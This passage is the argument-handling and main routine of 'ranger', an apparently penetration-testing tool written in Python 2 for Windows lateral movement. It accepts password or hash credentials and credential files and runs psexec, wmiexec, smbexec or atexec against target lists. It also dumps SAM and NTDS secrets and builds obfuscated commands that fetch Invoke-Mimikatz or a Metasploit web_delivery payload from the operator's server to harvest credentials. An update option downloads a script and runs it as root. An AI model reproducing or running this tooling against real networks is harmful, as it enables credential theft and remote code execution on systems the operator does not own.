    remote_attack.add_argument("-sS", action="store_true", dest="scan_syn", default=False, help="Verify the port is open with nmap SYN Stealth scan prior to exploitation")
    remote_attack.add_argument("--dom", action="store", dest="dom", default="WORKGROUP", help="The domain the user is apart of, defaults to WORKGROUP")
    remote_attack.add_argument("--usr", action="store", dest="usr", default=None, help="The username that will be used to exploit the system")
    remote_attack.add_argument("--pwd", action="store", dest="pwd", default=None, help="The password that will be used to exploit the system")
    remote_attack.add_argument("--creds-file", action="store", dest="creds_file", default=None, help="A file with multiple lines of credentials with each element deliniated by a space, domains are optional in the file, and can be applied universally to all creds with the --dom argument, the same hash formats accepted by command line are accepted in the file to include Metasploit PWDUMP, Metasploit hash_dump and smart_hash_dump formats, each line of the file should be formated as one of the following: username password, username hash, username password domain, username hash, Hash_in_PWDUMP_format, Hash_in_PWDUMP_format domain")
    method.add_argument("--psexec", action="store_true", dest="psexec_cmd", help="Inject the invoker process into the system memory with psexec")
    method.add_argument("--wmiexec", action="store_true", dest="wmiexec_cmd", help="Inject the invoker process into the system memory with wmiexec")
    method.add_argument("--smbexec", action="store_true", dest="smbexec_cmd", help="Inject the invoker process into the system memory with smbexec")
    method.add_argument("--atexec", action="store_true", dest="atexec_cmd", help="Inject the command task into the system memory with at on systems older than Vista")
    attack.add_argument("--scout", action="store_true", dest="netview_cmd", help="Identify logged in users on a target machine")
    #generator.add_argument("--filename", action="store", dest="filename", default=None, help="The file that the attack script will be dumped to")
    remote_attack.add_argument("--aes", action="store", dest="aes_key", default=None, help="The AES Key Option")
    remote_attack.add_argument("--share", action="store", default="ADMIN$", dest="share", help="The Share to execute against, the default is ADMIN$")
    remote_attack.add_argument('--mode', action="store", dest="mode", choices=['SERVER','SHARE'], default="SERVER", help="Mode to use for --smbexec, default is SERVER, which requires root access, SHARE does not")
    remote_attack.add_argument("--protocol", action="store", dest="protocol", choices=['445/SMB','139/SMB'], default="445/SMB", help="The protocol to attack over, the default is 445/SMB")
    remote_attack.add_argument("--directory", action="store", dest="directory", default="C:\\", help="The directory to either drop the payload or instantiate the session")
    sam_dump_options.add_argument("--system", action="store", help="The SYSTEM hive to parse")
    sam_dump_options.add_argument("--security", action="store", help="The SECURITY hive to parse")
    sam_dump_options.add_argument("--sam", action="store", help="The SAM hive to parse")
    sam_dump_options.add_argument("--ntds", action="store", help="The NTDS.DIT file to parse")
    obfiscation.add_argument("--encoder", action="store_true", help="Set to encode the commands that are being executed")
    #obfiscation.add_argument("--delivery", action="store", dest="delivery", choices=['web','smb'], default="web", help="Set the type of catapult server the payload will be downloaded from, web or smb")
    obfiscation.add_argument("--share-name", action="store", dest="share_name", default="ranger", help="Provide a specific share name to reference with SMB delivery")
    parser.add_argument("-l", "--logfile", action="store", dest="log", default="/opt/ranger/log/results.log", type=str, help="The log file to output the results")
    parser.add_argument("-v", action="count", dest="verbose", default=1, help="Verbosity level, defaults to one, this outputs each command and result")
    parser.add_argument("-q", action="store_const", dest="verbose", const=0, help="Sets the results to be quiet")
    parser.add_argument("--update", action="store_true", dest="update", default=False, help="Updates ranger and the supporting libraries")
    parser.add_argument('--version', action='version', version='%(prog)s 0.43b')

    args = parser.parse_args()

    # Argument Validator
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    if args.update:
        try:
            os.system("wget https://raw.githubusercontent.com/funkandwagnalls/ranger/master/setup.sh -O /root/setup.sh && chmod a+x /root/setup.sh")
        except Exception, e:
            print("[!] An error occurred downloading the update files: %s") % (e)
        try:
            os.system("/root/setup.sh && rm /root/setup.sh")
        except Exception, e:
            print("[!] An error occurred when executing the installation script: %s") % (e)

    # Set Constructors
    verbose = args.verbose             # Verbosity level
    src_port = args.src_port           # Port to source the Mimikatz script on
    #delivery = args.delivery          # Uncomment when delivery option for SMB works
    delivery = "web"
    share_name = args.share_name
    log = args.log
    if ".log" not in log:
        log = log + ".log"
    level = logging.DEBUG                                                                             # Logging level
    format = logging.Formatter("%(asctime)s [%(levelname)-5.5s]  %(message)s") # Log format
    logger_obj = logging.getLogger()                                                                  # Getter for logging agent
    file_handler = logging.FileHandler(args.log)                                                      # File Handler
    #stderr_handler = logging.StreamHandler()                                                          # STDERR Handler
    src_ip = args.src_ip               # IP to source the Mimikatz script on
    payload = args.payload             # The name of the payload that will be used
    interface = args.interface         # The interface to grab the IP from
    mim_func = args.mim_func           # The function that is executed
    mim_arg = args.mim_arg             # The argument processed by the function
    invoker = args.invoker             # Holds the results for invoker execution
    executor = args.executor           # Holds the results for the executor attack
    downloader = args.downloader       # Holds the results for exploit/multi/script/web_delivery
    smbexec_cmd = args.smbexec_cmd     # Holds the results for smbexec execution
    wmiexec_cmd = args.wmiexec_cmd     # Holds the results for the wmiexec execution
    psexec_cmd = args.psexec_cmd       # Holds the results for the psexec execution
    atexec_cmd = args.atexec_cmd
    netview_cmd = args.netview_cmd
    aes = args.aes_key
    share = args.share
    protocol = args.protocol
    directory = args.directory
    usr = args.usr
    pwd = args.pwd
    dom = args.dom
    target = args.target
    target_filename = args.target_filename
    exceptor = args.exceptor
    exception_filename = args.exception_filename
    command = args.command
    #filename = args.filename
    sam_dump = args.sam_dump
    mode = args.mode.upper()
    system = args.system
    security = args.security
    sam = args.sam
    ntds = args.ntds
    group = args.group
    encoder = args.encoder
    xml_targets = args.xml_targets
    xml_exceptions = args.xml_exceptions
    scan_tcp = args.scan_tcp
    scan_syn = args.scan_syn
    creds_file = args.creds_file
    targets_list = []
    exceptions_list = []
    tgt_list = []
    exc_list = []
    LM = ""
    NTLM = ""
    no_output = False
    execution = ""
    supplement = ""
    unprotected_command = ""
    hash = None
    methods = False
    kerberos = False
    attacks = True
    method_dict = {}
    dst = ""
    test = ""
    srv = None
    verify_port = ''
    verify_service = ''
    entry = []
    processed_xml_targets_dict = {}
    processed_xml_exceptions_dict = {}
    creds_list = []
    creds_dict = {}
    temp_key = None
    SID_temp = None
    LM_temp = ""
    hash_temp = None
    usr_temp = None
    pwd_temp = None
    NTLM_temp = ""

    # Configure logger formats for STDERR and output file
    file_handler.setFormatter(format)
    #stderr_handler.setFormatter(format)

    # Configure logger object
    logger_obj.addHandler(file_handler)
    #logger_obj.addHandler(stderr_handler)
    logger_obj.setLevel(level)

    # Get details for catapult server
    if payload != None:
        cwd = str(os.path.dirname(payload))
        if "/" not in cwd:
            cwd = str(os.getcwd())
        payload = os.path.basename(payload)
        payload = ''.join(payload)
    elif delivery == "web":
        cwd = "/opt/ranger/web/"
    elif delivery == "smb":
        cwd = "/opt/ranger/smb/"
        src_port = 445

    if aes != None:
        kerberos = True
    #if filename:
    #    payload = filename

    if smbexec_cmd or wmiexec_cmd or psexec_cmd or atexec_cmd:
        methods = True

    if scan_tcp:
        scan_type = "tcp"
    elif scan_syn:
        scan_type = "syn"
    else:
        scan_type = None

    if not (methods or sam_dump or netview_cmd) and (scan_type):
        sys.exit("[!] If you are going to execute a verification scan you have to choose a method to use for exploiting a target")

    if creds_file:
        with open(creds_file) as f:
            creds_list = f.readlines()
        for cred in creds_list:
            if cred and ":" in cred and cred.count(':') == 6:
                if cred.count(' ') == 1:
                    cred = cred.rstrip()
                    hash_temp, dom_temp = cred.split(' ')
                    if "WORKGROUP" not in dom:
                        dom_temp = dom
                    SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(hash_temp, verbose)
                    temp_key = "%s\%s" % (dom_temp, usr_temp)
                    print(temp_key) #DEBUG
                    if not usr_temp:
                        sys.exit("[!] Hash %s does not have a username") % (hash_temp)
                    if temp_key in creds_dict:
                        temp_list = creds_dict[temp_key]
                        temp_list[0] = SID_temp
                        temp_list[1] = LM_temp
                        temp_list[2] = NTLM_temp
                        temp_list[3] = hash_temp    
                    else:
                        creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp]
                elif cred.count(' ') == 0:
                    hash_temp = cred.rstrip()
                    dom_temp = dom
                    SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(hash_temp, verbose)
                    temp_key = "%s\%s" % (dom_temp, usr_temp)
                    if not usr_temp:
                        sys.exit("[!] Hash %s does not have a username") % (hash_temp)
                    if temp_key in creds_dict:
                        temp_list = creds_dict[temp_key]
                        temp_list[0] = SID_temp
                        temp_list[1] = LM_temp
                        temp_list[2] = NTLM_temp
                        temp_list[3] = hash_temp
                    else:
                        creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp]
            elif cred and ":" in cred and cred.count(':') == 1:
                if cred.count(' ') == 1:
                    cred = cred.rstrip()
                    usr_temp, hash_temp = cred.split(' ')
                    dom_temp = dom
                    SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(hash_temp, verbose, usr_temp, dom_temp)
                    temp_key = "%s\%s" % (dom_temp, usr_temp)
                    if not usr_temp:
                        sys.exit("[!] Hash %s does not have a username") % (hash_temp)
                    if temp_key in creds_dict:
                        temp_list = creds_dict[temp_key]
                        temp_list[0] = SID_temp
                        temp_list[1] = LM_temp
                        temp_list[2] = NTLM_temp
                        temp_list[3] = hash_temp
                    else:
                        creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp]
                elif cred.count(' ') == 2:
                    cred = cred.rstrip()
                    usr_temp, pwd_temp, dom_temp = cred.sploit(' ')
                    temp_key = "%s\%s" % (dom_temp, usr_temp)
            elif cred.count(' ') == 1:
                cred = cred.rstrip()
                dom_temp = dom
                if "WORKGROUP" not in dom:
                    dom_temp = dom
                usr_temp, pwd_temp = cred.split(' ')
                temp_key = "%s\%s" % (dom_temp, usr_temp)
                if not usr_temp:
                    sys.exit("[!] Hash %s does not have a username") % (hash_temp)
                if temp_key in creds_dict:
                    temp_list = creds_dict[temp_key]
                    temp_list[4] = usr_temp
                    temp_list[5] = pwd_temp
                else:
                    creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp]
            elif cred.count(' ') == 2:
                cred = cred.rstrip()
                usr_temp, pwd_temp, dom_temp = cred.split(' ')
                if "WORKGROUP" not in dom:
                   dom_temp = dom
                temp_key = "%s\%s" % (dom_temp, usr_temp)
                creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp]
            else:
                sys.exit("[!] An error occured trying to parse the credential file")

    if smbexec_cmd:
        verify_port, verify_service = protocol.split('/')
    if atexec_cmd:
        verify_port, verify_service = protocol.split('/')
    if psexec_cmd:
        verify_port, verify_service = protocol.split('/')
    if wmiexec_cmd:
        verify_port = "135"
    if sam_dump:
        verify_port = "445"
    if netview_cmd:
        verify_port = "445"

    if invoker  == None and methods == False:
        print("[!] This script requires either a command, an invoker attack, or a downloader attack")
        parser.print_help()
        sys.exit(1)

    if pwd and ":" in pwd and not creds_dict:
        SID, LM, NTLM, hash, usr, pwd = pwd_test(pwd, verbose, usr)

    creds_dict_status = is_empty(creds_dict)

    if smbexec_cmd or wmiexec_cmd or atexec_cmd or psexec_cmd or sam_dump:
        method_dict = {"smbexec" : smbexec_cmd, "wmiexec" : wmiexec_cmd, "atexec" : atexec_cmd, "psexec" : psexec_cmd}
        if not creds_dict and usr == None and pwd == None:
            sys.exit("[!] If you are trying to exploit a system you need a username and password")
        if target == None and target_filename == None and xml_targets == None:
            sys.exit("[!] If you are trying to exploit a system you need at least one target")

    gateways = get_gateways()
    network_ifaces = get_networks(gateways)
    if src_ip == None:
        try:
           src_ip = network_ifaces[interface]['addr']
        except Exception, e:
            print("[!] No IP address found on interface %s") % (interface)

    if target_filename:
        with open(target_filename) as f:
            targets_list = [line.rstrip() for line in f]

    if xml_targets:
        processed_xml_targets_dict = xml_list_process(xml_targets, verbose)
    if xml_exceptions:
        processed_xml_exceptions_dict = xml_list_process(xml_exceptions, verbose)

    for key, entry in processed_xml_targets_dict.iteritems():
        if "tcp" in entry[2] and verify_port in entry[3] and "open" in entry[6]:
            if verbose > 1:
                print("[+] Adding %s to target list") % (entry[1])
            targets_list.append(entry[1])
        if verbose > 2:
            print("[*] Hostname: %s IP: %s Protocol: %s Port: %s Service: %s State: %s MAC address: %s" % (entry[0], entry[1], entry[2], entry[3], entry[4], entry[6], entry[5]))

    # Process targets
    if target and "," in target:
        targets_list.extend(target.split(','))
    elif target:
        targets_list.append(target)
    if targets_list:
        for item in targets_list:
            try:
                tgt = TargetConverter(item)
            except Exception, e:
                print("[!] The following error occurred %s") % (e)
                sys.exit(1)
            try:
                tgt_list.extend(tgt.return_targets())
            except Exception, e:
                print("[!] The following error occurred %s") % (e)
                sys.exit(1)
    else:
        tgt_list.extend(targets_list)
    
    # Process exceptions
    if exception_filename:
        with open(exception_filename) as f:
            exceptions_list = [line.rstrip() for line in f]

    for key, entry in processed_xml_exceptions_dict.iteritems():
        if "tcp" in entry[2] and verify_port in entry[3] and "open" in entry[6]:
            if verbose > 1:
                print("[+] Adding %s to exceptions list") % (entry[1])
            targets_list.append(entry[1])
        if verbose > 2:
            print("[*] Hostname: %s IP: %s Protocol: %s Port: %s Service: %s State: %s MAC address: %s" % (entry[0], entry[1], entry[2], entry[3], entry[4], entry[6], entry[5]))

    if exceptor and "," in exceptor:
        exceptions_list.extend(targets.split(','))
    elif exceptor:
        exceptions_list.append(exceptor)
    if exceptions_list:
        for item in exceptions_list:
            try:
                exc = TargetConverter(item)
            except Exception, e:
                print("[!] The following error occurred %s") % (e)
                sys.exit(1)
            try:
                exc_list.extend(exc.return_targets())
            except Exception, e:
                print("[!] The following error occurred %s") % (e)
                sys.exit(1)
    else:
        exc_list.extend(exceptions_list)

    exc_list.append(src_ip)
    tgt_list = list(set(tgt_list))
    exc_list = list(set(exc_list))
    final_targets = [ip for ip in tgt_list if ip not in exc_list]
    final_targets.sort()

    if invoker:
        execution = "invoker"
        if mim_func == None:
            mim_func = "Invoke-Mimikatz"
        if mim_arg == None:
            mim_arg = "-DumpCreds"
        if payload == None:
            payload = "im.ps1"
        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group, delivery, share_name)
        command, unprotected_command = x.return_command()
    elif executor:
        if not payload or not mim_func:
            sys.exit("[!] You must provide at least the name tool to be injected into memory and the cmdlet name to be executed")
        execution = "executor"
        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group, delivery, share_name)
        command, unprotected_command = x.return_command()
    elif downloader:
        if delivery == "smb":
            sys.exit("[!] The Metasploit web_delivery module only works through web server based attacks")
        execution = "downloader"
        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group, delivery, share_name)
        command, unprotected_command = x.return_command()
    elif group:
        execution = "group"
        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group, delivery, share_name)
        command, unprotected_command = x.return_command()
    elif netview_cmd:
        attacks = True
    elif sam_dump:
        attacks = True
    elif command:
        attacks = False
    else:
        attacks = False

    if not attacks and not methods:
        sys.exit("[!] You need to provide ranger with details necessary to execute relevant attacks and methods")

    instructions = instructions_func(payload, src_port, command, unprotected_command, smbexec_cmd, execution, delivery)

    if methods and sam_dump:
        sys.exit("[!] You do not execute the --secrets-dump with a method, it should be executed on its own.")
    if not final_targets and not execution:
        sys.exit("[!] No targets to exploit or commands to provide")

    if creds_dict:
        for key, value in creds_dict.iteritems():
            SID = value[0]
            LM = value[1]
            NTLM = value[2]
            hash = value[3]
            usr = value[4]
            pwd = value[5]
            dom = value[6]
            method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder)
    else: 
        method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder)


if __name__ == '__main__':
    main()
